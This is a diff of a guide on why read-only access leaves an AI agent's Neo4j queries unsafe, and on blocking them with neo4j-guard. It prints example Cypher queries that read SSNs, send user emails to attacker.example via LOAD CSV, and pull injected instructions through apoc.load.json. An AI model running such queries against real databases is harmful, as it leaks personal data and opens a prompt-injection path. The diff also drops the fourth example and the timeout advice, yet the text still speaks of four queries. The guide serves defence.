@@ -18,35 +18,27 @@ Both stop queries that change the graph. Whatever query the agent writes, it can
 
 Read-only asks one question about a query: does it write? A query that only reads passes, whatever else it does. These four queries pass, and each one still causes harm.
 
-The first reads data the agent should not see. Read-only access controls what a query can change, not what it can read, so if the graph stores social security numbers, the agent can return them. Whatever a query returns goes into the agent's context, and from there to whoever is talking to the agent.
-
 ```cypher
 MATCH (p:Person) RETURN p.name, p.ssn
 ```
 
-The second sends data to another server. `LOAD CSV` is a read clause: it reads rows from a file or a URL. When the URL is built from graph data, the request itself carries the data out. This query sends one request per user, each with that user's email in it.
+This reads data the agent should not see. Read-only access controls what a query can change, not what it can read, so if the graph stores social security numbers, the agent can return them. Whatever a query returns goes into the agent's context, and from there to whoever is talking to the agent.
 
 ```cypher
 MATCH (u:User) LOAD CSV FROM 'https://attacker.example/?email=' + u.email AS row RETURN row
 ```
 
-The third brings instructions in. APOC procedures such as `apoc.load.json` also read URLs. The response comes back to the agent as query results, and the agent can follow instructions written in it. The database becomes the path for a prompt injection.
+This sends data to another server. `LOAD CSV` is a read clause: it reads rows from a file or a URL. When the URL is built from graph data, the request itself carries the data out. This query sends one request per user, each with that user's email in it.
 
 ```cypher
 CALL apoc.load.json('https://attacker.example/prompt.json') YIELD value RETURN value
 ```
 
-The fourth overloads the database. A query can read so much that it uses up the database's memory and keeps other queries waiting. This one counts every path in the graph.
-
-```cypher
-MATCH p = ()-[*]-() RETURN count(p)
-```
+This brings instructions in. APOC procedures such as `apoc.load.json` also read URLs. The response comes back to the agent as query results, and the agent can follow instructions written in it. The database becomes the path for a prompt injection.
 
 ## How to cover the gaps
 
-The first three need a check that looks at what a query does, not only whether it writes. `neo4j-guard` parses each query before it is sent and allows only read clauses, built-in functions, and schema and search procedures. That blocks `LOAD CSV` and APOC, which covers the second and third queries. Properties listed in `disallow` are blocked in queries and in returned records, which covers the first.
-
-The fourth query uses only clauses that `neo4j-guard` allows, so it needs a different limit: a transaction timeout, after which Neo4j stops the query.
+The check needs to look at what a query does, not only whether it writes. `neo4j-guard` parses each query before it is sent and allows only safe clauses, procedures and functions. By default, it blocks everything else, including `LOAD CSV` and APOC. It has configurable `allow` and `disallow` lists that override the defaults.
 
 The example below uses both. Install `neo4j-guard`:
 
